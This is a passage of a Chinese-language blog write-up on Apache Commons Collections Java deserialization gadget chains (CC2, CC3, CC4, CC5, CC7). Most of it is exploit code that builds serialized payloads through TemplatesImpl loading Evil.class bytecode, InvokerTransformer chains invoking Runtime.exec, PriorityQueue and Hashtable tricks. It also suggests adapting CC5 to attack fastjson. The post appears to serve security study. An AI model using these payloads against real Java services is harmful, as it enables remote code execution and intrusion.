class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        bytecodes.set(templates,<span class="built_in">new</span> <span class="type">byte</span>[][]&#123;bytecode&#125;);</span><br><span class="line">        Field name = templates.getClass().getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        name.set(templates,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        ConstantTransformer constantTransformer = <span class="built_in">new</span> ConstantTransformer(TrAXFilter.class);</span><br><span class="line">        InstantiateTransformer instantiateTransformer = <span class="built_in">new</span> InstantiateTransformer(<span class="built_in">new</span> Class[]&#123;Templates.class&#125;, <span class="built_in">new</span> Object[]&#123;templates&#125;);</span><br><span class="line">        ChainedTransformer chainedTransformer = <span class="built_in">new</span> ChainedTransformer(<span class="built_in">new</span> Transformer[]&#123;constantTransformer, instantiateTransformer&#125;);</span><br><span class="line">        Map lazyMap = LazyMap.decorate(<span class="built_in">new</span> HashMap(), chainedTransformer);</span><br><span class="line">        TiedMapEntry tiedMapEntry = <span class="built_in">new</span> TiedMapEntry(<span class="built_in">new</span> HashMap(),<span class="string">&quot;b&quot;</span>);</span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="built_in">new</span> HashMap&lt;&gt;();</span><br><span class="line">        hashMap.put(tiedMapEntry,<span class="string">&quot;a&quot;</span>);</span><br><span class="line">        Field <span class="keyword">map</span> = tiedMapEntry.getClass().getDeclaredField(<span class="string">&quot;map&quot;</span>);</span><br><span class="line">        <span class="keyword">map</span>.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">map</span>.set(tiedMapEntry,lazyMap);</span><br><span class="line">        serialize(hashMap);</span><br><span class="line">        deserialize();</span><br></pre></td></tr></table></figure>
+<h3 id="InvokerTransformer"><a href="#InvokerTransformer" class="headerlink" title="InvokerTransformer"></a>InvokerTransformer</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">byte</span>[] bytecode = Files.readAllBytes(Paths.get(<span class="string">&quot;/Users/xuemo/Desktop/java_project/debug/target/classes/Evil.class&quot;</span>));</span><br><span class="line">        TemplatesImpl templates = <span class="built_in">new</span> TemplatesImpl();</span><br><span class="line">        Field bytecodes = templates.getClass().getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        bytecodes.set(templates,<span class="built_in">new</span> <span class="type">byte</span>[][]&#123;bytecode&#125;);</span><br><span class="line">        Field name = templates.getClass().getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        name.set(templates,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        ConstantTransformer constantTransformer = <span class="built_in">new</span> ConstantTransformer(templates);</span><br><span class="line">        InvokerTransformer newTransformer = <span class="built_in">new</span> InvokerTransformer(<span class="string">&quot;newTransformer&quot;</span>, null, null);</span><br><span class="line">        ChainedTransformer chainedTransformer = <span class="built_in">new</span> ChainedTransformer(<span class="built_in">new</span> Transformer[]&#123;constantTransformer, newTransformer&#125;);</span><br><span class="line">        Map lazyMap = LazyMap.decorate(<span class="built_in">new</span> HashMap(), chainedTransformer);</span><br><span class="line">        TiedMapEntry tiedMapEntry = <span class="built_in">new</span> TiedMapEntry(<span class="built_in">new</span> HashMap(),<span class="string">&quot;b&quot;</span>);</span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="built_in">new</span> HashMap&lt;&gt;();</span><br><span class="line">        hashMap.put(tiedMapEntry,<span class="string">&quot;a&quot;</span>);</span><br><span class="line">        Field <span class="keyword">map</span> = tiedMapEntry.getClass().getDeclaredField(<span class="string">&quot;map&quot;</span>);</span><br><span class="line">        <span class="keyword">map</span>.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">map</span>.set(tiedMapEntry,lazyMap);</span><br><span class="line">        serialize(hashMap);</span><br></pre></td></tr></table></figure>
+<h3 id="细节"><a href="#细节" class="headerlink" title="细节"></a>细节</h3><p>这里注意一个细节，在TemplatesImpl反序列化的时候，_name,_bytecodes会从我们赋予的值里面获取，不然就是null，所以我们还需要反射赋值，但是_tfactory不需要赋值了，他会自动赋值<br><img src="https://cdn.nlark.com/yuque/0/2023/png/29417415/1699081422103-ea16a860-30a6-47cd-9b94-37f955dc1e60.png#averageHue=%23282b32&clientId=uc8f9044e-263b-4&from=drop&id=xLFAm&originHeight=664&originWidth=1330&originalType=binary&ratio=2&rotation=0&showTitle=false&size=626130&status=done&style=none&taskId=u0458b016-0231-45dc-95ee-f2497ddc8ff&title=" alt="截屏2023-11-04 15.03.33.png"></p>
+<h1 id="cc4"><a href="#cc4" class="headerlink" title="cc4"></a>cc4</h1><p><img src="https://cdn.nlark.com/yuque/0/2023/png/29417415/1699082303041-1486e452-3d0a-43a3-9111-d22c74c6d7f4.png#averageHue=%23f8f8f8&clientId=uc8f9044e-263b-4&from=drop&id=nGWPh&originHeight=506&originWidth=1630&originalType=binary&ratio=2&rotation=0&showTitle=false&size=563489&status=done&style=none&taskId=ua12884ee-53d5-4b1b-9ad2-7f7a787b067&title=" alt="截屏2023-11-04 15.18.19.png"></p>
+<h2 id="依赖-1"><a href="#依赖-1" class="headerlink" title="依赖"></a>依赖</h2><p>变成4版本了</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.apache.commons&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;commons-collections4&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;<span class="number">4.0</span>&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>
+<h2 id="变化"><a href="#变化" class="headerlink" title="变化"></a>变化</h2><p>4版本里TransformingComparator也继承了Serializable，导致了链子的产生<br><img src="https://cdn.nlark.com/yuque/0/2023/png/29417415/1698894530327-41ed4d54-d849-49be-904e-a5732b4c8057.png#averageHue=%2327292c&clientId=uf8396875-8680-4&from=drop&id=u09436655&originHeight=142&originWidth=1402&originalType=binary&ratio=2&rotation=0&showTitle=false&size=128101&status=done&style=none&taskId=uec11fc55-1ca5-4c61-b6ea-0579ff0c25f&title=" alt="截屏2023-11-02 11.08.46.png"></p>
+<h2 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h2><h3 id="InvokerTransformer-1"><a href="#InvokerTransformer-1" class="headerlink" title="InvokerTransformer"></a>InvokerTransformer</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">ConstantTransformer constantTransformer = <span class="built_in">new</span> ConstantTransformer(Runtime.class);</span><br><span class="line">        InvokerTransformer getMethod = <span class="built_in">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>,<span class="built_in">new</span> Class[]&#123; String.class,Class[].class&#125;, <span class="built_in">new</span> Object[]&#123;<span class="string">&quot;getRuntime&quot;</span>,null&#125;);</span><br><span class="line">        InvokerTransformer invoke = <span class="built_in">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="built_in">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="built_in">new</span> Object[]&#123;null, null&#125;);</span><br><span class="line">        InvokerTransformer exec = <span class="built_in">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>, <span class="built_in">new</span> Class[]&#123;String.class&#125;, <span class="built_in">new</span> Object[]&#123;<span class="string">&quot;code&quot;</span>&#125;);</span><br><span class="line">        ChainedTransformer chainedTransformer = <span class="built_in">new</span> ChainedTransformer(<span class="built_in">new</span> Transformer[]&#123;constantTransformer, getMethod, invoke, exec&#125;);</span><br><span class="line">        TransformingComparator transformingComparator = <span class="built_in">new</span> TransformingComparator(chainedTransformer);</span><br><span class="line"><span class="comment">//        transformingComparator.compare(&quot;a&quot;,&quot;b&quot;);</span></span><br><span class="line">        PriorityQueue priorityQueue = <span class="built_in">new</span> PriorityQueue(transformingComparator);</span><br><span class="line">        Field size = priorityQueue.getClass().getDeclaredField(<span class="string">&quot;size&quot;</span>);</span><br><span class="line">        size.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        size.set(priorityQueue,<span class="number">2</span>);</span><br><span class="line">        serialize(priorityQueue);</span><br></pre></td></tr></table></figure>
+<h3 id="InstantiateTransformer-1"><a href="#InstantiateTransformer-1" class="headerlink" title="InstantiateTransformer"></a>InstantiateTransformer</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">byte</span>[] bytecode = Files.readAllBytes(Paths.get(<span class="string">&quot;/Users/xuemo/Desktop/java_project/debug/target/classes/Evil.class&quot;</span>));</span><br><span class="line">        TemplatesImpl templates = <span class="built_in">new</span> TemplatesImpl();</span><br><span class="line">        Field bytecodes = templates.getClass().getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        bytecodes.set(templates,<span class="built_in">new</span> <span class="type">byte</span>[][]&#123;bytecode&#125;);</span><br><span class="line">        Field name = templates.getClass().getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        name.set(templates,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        InstantiateTransformer instantiateTransformer = <span class="built_in">new</span> InstantiateTransformer(<span class="built_in">new</span> Class[]&#123;Templates.class&#125;, <span class="built_in">new</span> Object[]&#123;templates&#125;);</span><br><span class="line">        ConstantTransformer constantTransformer = <span class="built_in">new</span> ConstantTransformer(TrAXFilter.class);</span><br><span class="line">        ChainedTransformer chainedTransformer = <span class="built_in">new</span> ChainedTransformer(<span class="built_in">new</span> Transformer[]&#123;constantTransformer, instantiateTransformer&#125;);</span><br><span class="line">        TransformingComparator transformingComparator = <span class="built_in">new</span> TransformingComparator(chainedTransformer);</span><br><span class="line">        PriorityQueue priorityQueue = <span class="built_in">new</span> PriorityQueue(transformingComparator);</span><br><span class="line">        Field size = priorityQueue.getClass().getDeclaredField(<span class="string">&quot;size&quot;</span>);</span><br><span class="line">        size.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        size.set(priorityQueue,<span class="number">2</span>);</span><br><span class="line">        serialize(priorityQueue);</span><br></pre></td></tr></table></figure>
+<h3 id="细节-1"><a href="#细节-1" class="headerlink" title="细节"></a>细节</h3><p>这里size默认是0，要保证(size&gt;&gt;&gt;1)-1&gt;&#x3D;0,size至少是2，所以要想进入siftDown我们必须size反射改成2<br><img src="https://cdn.nlark.com/yuque/0/2023/png/29417415/1699082554025-fdeb2e48-de82-4be5-9a8a-0286800dea01.png#averageHue=%232a303e&clientId=uc8f9044e-263b-4&from=drop&id=Di3Bk&originHeight=158&originWidth=866&originalType=binary&ratio=2&rotation=0&showTitle=false&size=97753&status=done&style=none&taskId=ueaae89bb-0804-4f0b-8212-2103a579c6b&title=" alt="截屏2023-11-04 15.22.28.png"></p>
+<h1 id="cc2"><a href="#cc2" class="headerlink" title="cc2"></a>cc2</h1><h2 id="与cc4区别"><a href="#与cc4区别" class="headerlink" title="与cc4区别"></a>与cc4区别</h2><p>CC2 区别与其他CC的点在于没有用 Transformer 数组。不用数组是因为比如 shiro 当中的漏洞，它会重写很多动态加载数组的方法，这就可能会导致我们的 EXP 无法通过数组实现。</p>
+<h2 id="调用流程-1"><a href="#调用流程-1" class="headerlink" title="调用流程"></a>调用流程</h2><p>TransformingComparator在compare的时候会传入一个参数<br><img src="https://cdn.nlark.com/yuque/0/2023/png/29417415/1698895809901-57ef400b-5e64-4146-82bc-f95e54f1d2cb.png#averageHue=%232a2d32&clientId=uf8396875-8680-4&from=drop&id=u26df5c55&originHeight=116&originWidth=944&originalType=binary&ratio=2&rotation=0&showTitle=false&size=85138&status=done&style=none&taskId=u83180752-df96-45a4-b37f-8ca2fcfd133&title=" alt="截屏2023-11-02 11.30.05.png"><br>obj1来自于x<br><img src="https://cdn.nlark.com/yuque/0/2023/png/29417415/1698895727336-63b4d528-3085-4704-bedf-adb5fdd9437d.png#averageHue=%23252629&clientId=uf8396875-8680-4&from=drop&id=uab94f101&originHeight=362&originWidth=1100&originalType=binary&ratio=2&rotation=0&showTitle=false&size=253710&status=done&style=none&taskId=uc669b900-34e6-40ce-8246-e9e95609383&title=" alt="截屏2023-11-02 11.28.30.png"><br>x来自于queue[i]，所以我们给queue传递值就好了<br><img src="https://cdn.nlark.com/yuque/0/2023/png/29417415/1698896134079-ffc2d204-18e0-422e-bfaf-3a2e2deba9db.png#averageHue=%2326282b&clientId=uf8396875-8680-4&from=drop&id=ucf8b0821&originHeight=274&originWidth=924&originalType=binary&ratio=2&rotation=0&showTitle=false&size=155638&status=done&style=none&taskId=uc91d3b9c-f792-4e32-b29d-7c56ee6d7ad&title=" alt="截屏2023-11-02 11.35.30.png"></p>
+<h2 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h2><h3 id="InvokerTransformer-2"><a href="#InvokerTransformer-2" class="headerlink" title="InvokerTransformer"></a>InvokerTransformer</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">byte</span>[] bytecode = Files.readAllBytes(Paths.get(<span class="string">&quot;/Users/xuemo/Desktop/java_project/debug/target/classes/Evil.class&quot;</span>));</span><br><span class="line">    TemplatesImpl templates = <span class="built_in">new</span> TemplatesImpl();</span><br><span class="line">    Field bytecodes = templates.getClass().getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">    bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    bytecodes.set(templates,<span class="built_in">new</span> <span class="type">byte</span>[][]&#123;bytecode&#125;);</span><br><span class="line">    Field name = templates.getClass().getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">    name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    name.set(templates,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">    InvokerTransformer newTransformer = <span class="built_in">new</span> InvokerTransformer(<span class="string">&quot;newTransformer&quot;</span>, null, null);</span><br><span class="line">    TransformingComparator transformingComparator = <span class="built_in">new</span> TransformingComparator(newTransformer);</span><br><span class="line">    PriorityQueue priorityQueue = <span class="built_in">new</span> PriorityQueue(transformingComparator);</span><br><span class="line">    Field size = priorityQueue.getClass().getDeclaredField(<span class="string">&quot;size&quot;</span>);</span><br><span class="line">    size.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    size.set(priorityQueue,<span class="number">2</span>);</span><br><span class="line">    Field queue = priorityQueue.getClass().getDeclaredField(<span class="string">&quot;queue&quot;</span>);</span><br><span class="line">    queue.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    queue.set(priorityQueue,<span class="built_in">new</span> Object[]&#123;templates,null&#125;);</span><br><span class="line">    serialize(priorityQueue);</span><br><span class="line">    deserialize();</span><br></pre></td></tr></table></figure>
+<h3 id="InstantiateTransformer-2"><a href="#InstantiateTransformer-2" class="headerlink" title="InstantiateTransformer"></a>InstantiateTransformer</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">byte</span>[] bytecode = Files.readAllBytes(Paths.get(<span class="string">&quot;/Users/xuemo/Desktop/java_project/debug/target/classes/Evil.class&quot;</span>));</span><br><span class="line">       TemplatesImpl templates = <span class="built_in">new</span> TemplatesImpl();</span><br><span class="line">       Field bytecodes = templates.getClass().getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">       bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">       bytecodes.set(templates,<span class="built_in">new</span> <span class="type">byte</span>[][]&#123;bytecode&#125;);</span><br><span class="line">       Field name = templates.getClass().getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">       name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">       name.set(templates,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">       InstantiateTransformer instantiateTransformer = <span class="built_in">new</span> InstantiateTransformer(<span class="built_in">new</span> Class[]&#123;Templates.class&#125;, <span class="built_in">new</span> Object[]&#123;templates&#125;);</span><br><span class="line">       TransformingComparator transformingComparator = <span class="built_in">new</span> TransformingComparator(instantiateTransformer);</span><br><span class="line">       PriorityQueue priorityQueue = <span class="built_in">new</span> PriorityQueue(transformingComparator);</span><br><span class="line">       Field size = priorityQueue.getClass().getDeclaredField(<span class="string">&quot;size&quot;</span>);</span><br><span class="line">       size.setAccessible(<span class="literal">true</span>);</span><br><span class="line">       size.set(priorityQueue,<span class="number">2</span>);</span><br><span class="line">       Field queue = priorityQueue.getClass().getDeclaredField(<span class="string">&quot;queue&quot;</span>);</span><br><span class="line">       queue.setAccessible(<span class="literal">true</span>);</span><br><span class="line">       queue.set(priorityQueue,<span class="built_in">new</span> Object[]&#123;TrAXFilter.class,null&#125;);</span><br><span class="line">       serialize(priorityQueue);</span><br><span class="line">       deserialize();</span><br></pre></td></tr></table></figure>
+<h1 id="cc5"><a href="#cc5" class="headerlink" title="cc5"></a>cc5</h1><p><img src="https://cdn.nlark.com/yuque/0/2023/png/29417415/1699083751199-7541f09b-314c-4480-a88d-e150dd5ea74a.png#averageHue=%23f9f9f9&clientId=uc8f9044e-263b-4&from=drop&id=SNpa5&originHeight=582&originWidth=1690&originalType=binary&ratio=2&rotation=0&showTitle=false&size=660157&status=done&style=none&taskId=u6b539972-090a-4a9b-9cbe-6a2f48b3651&title=" alt="截屏2023-11-04 15.42.24.png"></p>
+<h2 id="调用流程-2"><a href="#调用流程-2" class="headerlink" title="调用流程"></a>调用流程</h2><p>BadAttributeValueExpException.readObject可以调用toString<br>TiedMapEntry的toString会调用getValue,进而调用LazyMap</p>
+<h2 id="exp-5"><a href="#exp-5" class="headerlink" title="exp"></a>exp</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">ConstantTransformer constantTransformer=<span class="built_in">new</span> ConstantTransformer(Runtime.class);</span><br><span class="line">        InvokerTransformer getMethod = <span class="built_in">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="built_in">new</span> Class[]&#123;String.class,Class[].class&#125;, <span class="built_in">new</span> Object[]&#123;<span class="string">&quot;getRuntime&quot;</span>,null&#125;);</span><br><span class="line">        InvokerTransformer invokeMethod = <span class="built_in">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="built_in">new</span> Class[]&#123;Object.class,Object[].class&#125;, <span class="built_in">new</span> Object[]&#123;null,null&#125;);</span><br><span class="line">        InvokerTransformer execMethod = <span class="built_in">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>, <span class="built_in">new</span> Class[]&#123;String.class&#125;, <span class="built_in">new</span> Object[]&#123;<span class="string">&quot;code&quot;</span>&#125;);</span><br><span class="line">        Transformer[] transformers=<span class="built_in">new</span> Transformer[]&#123;constantTransformer,getMethod,invokeMethod,execMethod&#125;;</span><br><span class="line">        ChainedTransformer chainedTransformer = <span class="built_in">new</span> ChainedTransformer(transformers);</span><br><span class="line">        Map decorate = LazyMap.decorate(<span class="built_in">new</span> HashMap(), chainedTransformer);</span><br><span class="line">        TiedMapEntry tiedMapEntry = <span class="built_in">new</span> TiedMapEntry(decorate, <span class="string">&quot;a&quot;</span>);</span><br><span class="line">        BadAttributeValueExpException badAttributeValueExpException = <span class="built_in">new</span> BadAttributeValueExpException(<span class="string">&quot;a&quot;</span>);</span><br><span class="line">        Field val = badAttributeValueExpException.getClass().getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        val.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        val.set(badAttributeValueExpException,tiedMapEntry);</span><br><span class="line">        serialize(badAttributeValueExpException);</span><br><span class="line">        deserialize();</span><br></pre></td></tr></table></figure>
+<h2 id="拓展"><a href="#拓展" class="headerlink" title="拓展"></a>拓展</h2><p>cc5这个链子思路可以结合来打fastjson<br>JSON.toString会调用toJSONString，而fastjson在对象toJSONString以及toString的时候会调用对应的getter方法,所以比如说我们把TiedMapEntry换成fastjson，然后再利用恶意的getter方法进行rce</p>
+<h1 id="cc7"><a href="#cc7" class="headerlink" title="cc7"></a>cc7</h1><p><img src="https://cdn.nlark.com/yuque/0/2023/png/29417415/1699090084097-e007691a-768a-4d45-8ed4-1b570867fe7a.png#averageHue=%23f8f8f8&clientId=uc7c77b65-848a-4&from=drop&id=uae46c9a1&originHeight=540&originWidth=1672&originalType=binary&ratio=2&rotation=0&showTitle=false&size=619922&status=done&style=none&taskId=uda4f1c59-0b25-484b-adff-7e0a700ad6a&title=" alt="截屏2023-11-04 17.27.57.png"></p>
+<h2 id="构造细节"><a href="#构造细节" class="headerlink" title="构造细节"></a>构造细节</h2><h3 id="细节1-需要往hashtable-put两个Object"><a href="#细节1-需要往hashtable-put两个Object" class="headerlink" title="细节1 需要往hashtable put两个Object"></a>细节1 需要往hashtable put两个Object</h3><p>要想调用到equals首先要保证tab的值非空<br><img src="https://cdn.nlark.com/yuque/0/2023/png/29417415/1699087298601-718021b0-636e-4ef2-80f8-8c63749e3c4b.png#averageHue=%2328292c&clientId=uc7c77b65-848a-4&from=drop&id=B6QIo&originHeight=656&originWidth=1084&originalType=binary&ratio=2&rotation=0&showTitle=false&size=481734&status=done&style=none&taskId=u03df3d5b-e819-4430-b3b3-fd3f01b0d06&title=" alt="截屏2023-11-04 16.41.35.png"><br>一上来table是空的，所以第一次肯定不行<br><img src="https://cdn.nlark.com/yuque/0/2023/png/29417415/1699087340800-86fb2175-fa5f-4293-91f7-b5de7fc15d7f.png#averageHue=%23272a30&clientId=uc7c77b65-848a-4&from=drop&id=u59b58d80&originHeight=562&originWidth=1164&originalType=binary&ratio=2&rotation=0&showTitle=false&size=418594&status=done&style=none&taskId=u3751caec-cd59-443b-a76a-7a83a42e0e9&title=" alt="截屏2023-11-04 16.42.17.png"><br>但是第一次过了以后会给里面插入元素，就不是空的，所以我们要执行两次reconstituionPut<br><img src="https://cdn.nlark.com/yuque/0/2023/png/29417415/1699087369837-674e24b7-6c50-4535-806f-00f75c566094.png#averageHue=%23292a2d&clientId=uc7c77b65-848a-4&from=drop&id=ucb134013&originHeight=174&originWidth=850&originalType=binary&ratio=2&rotation=0&showTitle=false&size=103128&status=done&style=none&taskId=u24070cf5-699e-450b-82e6-9ba734b2bc6&title=" alt="截屏2023-11-04 16.42.45.png"></p>
+<h3 id="细节2-两个不同的Object具有相同的hashcode"><a href="#细节2-两个不同的Object具有相同的hashcode" class="headerlink" title="细节2 两个不同的Object具有相同的hashcode"></a>细节2 两个不同的Object具有相同的hashcode</h3><h4 id="Object不可以一样"><a href="#Object不可以一样" class="headerlink" title="Object不可以一样"></a>Object不可以一样</h4><p>下面是put的实现，可以看到不光要key的hash一样，key也要equals，他才认为是一个元素，如果object一样就只进行值的修改<br><img src="https://cdn.nlark.com/yuque/0/2023/png/29417415/1699088139746-e7f46c68-abd0-4b7f-aeee-132471c194c1.png#averageHue=%2326292e&clientId=uc7c77b65-848a-4&from=drop&id=zzebZ&originHeight=1044&originWidth=1238&originalType=binary&ratio=2&rotation=0&showTitle=false&size=825064&status=done&style=none&taskId=u7ce3a6b2-40f1-44f3-984b-0263d21c93b&title=" alt="截屏2023-11-04 16.55.33.png"><br>然后hashmap的equals比较又是比较每一个key-value是否一致，所以我们利用trick的话还是认为不是同一个key，刚好可以保证object不一样</p>
+<h4 id="hashcode要一样"><a href="#hashcode要一样" class="headerlink" title="hashcode要一样"></a>hashcode要一样</h4><p>再细看下面的代码，我们把第一个key叫做a，第二个key叫做b<br><img src="https://cdn.nlark.com/yuque/0/2023/png/29417415/1699087581469-8d64e4f3-c211-41e5-87ac-b6bd9f3b7178.png#averageHue=%23282a2d&clientId=uc7c77b65-848a-4&from=drop&id=ucb5f1785&originHeight=506&originWidth=1170&originalType=binary&ratio=2&rotation=0&showTitle=false&size=391549&status=done&style=none&taskId=u32564a6d-b7d9-4adc-9cd1-8fc2282de9e&title=" alt="截屏2023-11-04 16.46.17.png"><br>index是a.hashCode计算过来的<br>那我们在b进入函数的时候，要保证首先根据b.hashCode计算出来的index刚好是a.hashCode计算出来的index，这个可以通过我们后面的小trick绕过，让他里面只有2个元素，这样几率也大<br>但是还要保证e.hash&#x3D;&#x3D;hash,其实也就是a.hash&#x3D;&#x3D;b.hash,这就涉及到java的hash碰撞</p>
+<h3 id="细节3-究竟怎么触发到get（直接put无法避免序列化的时候rce）"><a href="#细节3-究竟怎么触发到get（直接put无法避免序列化的时候rce）" class="headerlink" title="细节3 究竟怎么触发到get（直接put无法避免序列化的时候rce）"></a>细节3 究竟怎么触发到get（直接put无法避免序列化的时候rce）</h3><p>这里如果是使用put传递的话，那么我们第一次put的会在反序列化的时候第一个取到，第二次put的会被第二个取到<br>还是假设第一次put的是a，第二次put的是b，相当于a.equals(b)<br><img src="https://cdn.nlark.com/yuque/0/2023/png/29417415/1699090232728-4a707ce9-d59b-46b4-a431-ca415c207426.png#averageHue=%23303540&clientId=uc7c77b65-848a-4&from=drop&id=ube18deea&originHeight=112&originWidth=982&originalType=binary&ratio=2&rotation=0&showTitle=false&size=94816&status=done&style=none&taskId=u61bb95ab-1be7-40bc-a237-90e763360c9&title=" alt="截屏2023-11-04 17.30.29.png"><br>继续a.equals(b)<br><img src="https://cdn.nlark.com/yuque/0/2023/png/29417415/1699090272824-a9740e90-ee26-40f9-ac84-1b2a082eca41.png#averageHue=%2326272a&clientId=uc7c77b65-848a-4&from=drop&id=udac2f7ad&originHeight=306&originWidth=728&originalType=binary&ratio=2&rotation=0&showTitle=false&size=143989&status=done&style=none&taskId=u7886c154-27b6-44bb-a2a8-b55ea906f1c&title=" alt="截屏2023-11-04 17.31.09.png"><br>下面是最后的equals函数了，里面的都是m.get . 也就是b.get<br><img src="https://cdn.nlark.com/yuque/0/2023/png/29417415/1699090327502-2afa77a2-5329-457c-bab4-c005012836fe.png#averageHue=%2326282c&clientId=uc7c77b65-848a-4&from=drop&id=u7b7391ed&originHeight=1110&originWidth=1076&originalType=binary&ratio=2&rotation=0&showTitle=false&size=763636&status=done&style=none&taskId=u5598c823-dc3b-4d6a-9cd4-5009d4f0365&title=" alt="截屏2023-11-04 17.32.04.png"><br>所以相当于不管在put的时候，还是后面反序列化的时候，都是我们第二个put的对象最终触发到rce,跟第一个put的元素无关，所以如果想要rce，所以用传统的put方式一定也会在序列化的时候rce，不然无法在反序列化的时候rce</p>
